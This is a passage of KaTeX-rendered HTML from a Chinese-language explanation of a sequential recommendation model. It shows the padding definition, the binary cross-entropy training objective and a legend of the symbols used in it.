mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-1.5625em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6643919999999999em;\"><span style=\"top:-2.378em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.49699999999999994em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9425em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4425em;\"><span style=\"top:-4.442500000000001em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord cjk_fallback\">如果</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">是一个填充项</span></span></span></span><span style=\"top:-3.0025em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">n</span></span></span><span style=\"top:-1.5625em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9425em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<ul>\n<li>\n<p>其中 pad 表示填充项，我们的模型以序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">s</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span></span></span></span> 作为输入，响应的序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>o</mi></mrow><annotation encoding=\"application/x-tex\">o</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">o</span></span></span></span> 为预期输出，我们采用二院交叉熵损失作为目标函数</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo>−</mo><munder><mo>∑</mo><mrow><msup><mi mathvariant=\"script\">S</mi><mi>u</mi></msup><mo>∈</mo><mi mathvariant=\"script\">S</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>t</mi><mo>∈</mo><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">]</mo></mrow></munder><mrow><mo fence=\"true\">[</mo><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>r</mi><mrow><msub><mi>o</mi><mi>t</mi></msub><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo>+</mo><munder><mo>∑</mo><mrow><mi>j</mi><mo>∉</mo><msup><mi mathvariant=\"script\">S</mi><mi>u</mi></msup></mrow></munder><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo>−</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msub><mi>r</mi><mrow><mi>j</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">-\\sum_{\\mathcal{S}^u\\in\\mathcal{S}}\\sum_{t\\in[1,2,...,n]}\\left[\\log(\\sigma(r_{o_t,t}))+\\sum_{j\\not\\in\\mathcal{S}^u}\\log(1-\\sigma(r_{j,t}))\\right]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.6010299999999997em;vertical-align:-1.55002em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.075em;\">S</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.808995em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mrel mtight\">∈</span><span class=\"mopen mtight\">[</span><span class=\"mord mtight\">1</span><span class=\"mpunct mtight\">,</span><span class=\"mord mtight\">2</span><span class=\"mpunct mtight\">,</span><span class=\"mord mtight\">.</span><span class=\"mord mtight\">.</span><span class=\"mord mtight\">.</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">n</span><span class=\"mclose mtight\">]</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.516005em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎣</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎢</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎡</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.28055599999999997em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8478869999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\"><span class=\"mord vbox mtight\"><span class=\"thinbox mtight\"><span class=\"rlap mtight\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"inner\"><span class=\"mrel mtight\"></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.075em;\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5935428571428571em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.438221em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0510099999999998em;\"><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎦</span></span></span><span style=\"top:-2.8099900000000004em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎥</span></span></span><span style=\"top:-4.05101em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.55002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>S</mi><mo>:</mo><mtext>表示所有用户的集合。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>S</mi><mi>u</mi></msup><mspace></mspace><mspace width=\"0.1111111111111111em\"/><mo lspace=\"0em\" rspace=\"0.17em\"></mo><mtext> ⁣</mtext><mo lspace=\"0em\" rspace=\"0em\">:</mo><mspace width=\"0.3333333333333333em\"/><mtext>表示用户 </mtext><mi>u</mi><mtext> 的序列。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>t</mi><mspace></mspace><mspace width=\"0.1111111111111111em\"/><mo lspace=\"0em\" rspace=\"0.17em\"></mo><mtext> ⁣</mtext><mo lspace=\"0em\" rspace=\"0em\">:</mo><mspace width=\"0.3333333333333333em\"/><mtext>表示时间步,取值范围为 </mtext><mo stretchy=\"false\">{</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">}</mo><mtext>。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>o</mi><mi>t</mi></msub><mspace></mspace><mspace width=\"0.1111111111111111em\"/><mo lspace=\"0em\" rspace=\"0.17em\"></mo><mtext> ⁣</mtext><mo lspace=\"0em\" rspace=\"0em\">:</mo><mspace width=\"0.3333333333333333em\"/><mtext>在时间步 </mtext><mi>t</mi><mtext> 的预测输出。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>r</mi><mrow><msub><mi>o</mi><mi>t</mi></msub><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mtext>:在时间步 </mtext><mi>t</mi><mtext> 预测物品 </mtext><msub><mi>o</mi><mi>t</mi></msub><mtext> 的相关性分数。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msub><mi>r</mi><mrow><mi>j</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mspace></mspace><mspace width=\"0.1111111111111111em\"/><mo lspace=\"0em\" rspace=\"0.17em\"></mo><mtext> ⁣</mtext><mo lspace=\"0em\" rspace=\"0em\">:</mo><mspace width=\"0.3333333333333333em\"/><mtext> 在时间步 </mtext><mi>t</mi><mtext> 预测物品 </mtext><mi>j</mi><mtext> 的相关性分数,</mtext><mi>j</mi><mo mathvariant=\"normal\">∉</mo><msup><mi>S</mi><mi>u</mi></msup><mtext> 表示不在用户 </mtext><mi>u</mi><mtext> 的历史</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>交互序列中的物品。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>σ</mi><mo>:</mo><mtext>表示</mtext><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>o</mi><mi>i</mi><mi>d</mi><mtext>函数。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;S:表示所有用户的集合。 \\\\\n&amp;S^{u}\\colon\\text{表示用户 }u\\text{ 的序列。} \\\\\n&amp;t\\colon\\text{表示时间步,取值范围为 }\\{1,2,\\ldots,n\\}。 \\\\\n&amp;o_{t}\\colon\\text{在时间步 }t\\text{ 的预测输出。} \\\\\n&amp;r_{o_t,t}\\text{:在时间步 }t\\text{ 预测物品 }o_t\\text{ 的相关性分数。} \\\\\n&amp;r_{j,t}\\colon\\text{ 在时间步 }t\\text{ 预测物品 }j\\text{ 的相关性分数,}j\\notin S^u\\text{ 表示不在用户 }u\\text{ 的历史} \\\\\n&amp;\\text{交互序列中的物品。} \\\\\n&amp;\\sigma:表示sigmoid函数。\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:12.000000000000002em;vertical-align:-5.750000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.250000000000001em;\"><span style=\"top:-8.25em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.75em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.749999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.249999999999999em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.7499999999999987em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.7500000000000009em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:2.250000000000001em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.750000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.250000000000001em;\"><span style=\"top:-8.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord cjk_fallback\">所</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord cjk_fallback\">户</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">集</span><span class=\"mord cjk_fallback\">合</span><span class=\"mord cjk_fallback\">。</span></span></span><span style=\"top:-6.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span></span></span></span></span><span class=\"mspace nobreak\"></span><span class=\"mspace\" style=\"margin-right:0.1111111111111111em;\"></span><span class=\"mpunct\"></span><span class=\"mspace\" style=\"margin-right:-0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mrel\">:</span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">表示用户</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">u</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的序列。</span></span></span></span><span style=\"top:-5.409999999999999em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\">t</span><span class=\"mspace nobreak\"></span><span class=\"mspace\" style=\"margin-right:0.1111111111111111em;\"></span><span class=\"mpunct\"></span><span class=\"mspace\" style=\"margin-right:-0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mrel\">:</span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">表示时间步</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">取值范围为</span><span class=\"mord\"> </span></span><span class=\"mopen\">{</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">}</span><span class=\"mord cjk_fallback\">。</span></span></span><span style=\"top:-3.9099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace nobreak\"></span><span class=\"mspace\" style=\"margin-right:0.1111111111111111em;\"></span><span class=\"mpunct\"></span><span class=\"mspace\" style=\"margin-right:-0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mrel\">:</span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">在时间步</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">t</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的预测输出。</span></span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.28055599999999997em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29634285714285713em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\">:</span><span class=\"mord cjk_fallback\">在时间步</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">t</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">预测物品</span><span class=\"mord\"> </span></span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">的相关性分数。</span></span></span></span><span style=\"top:-0.9099999999999988em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span 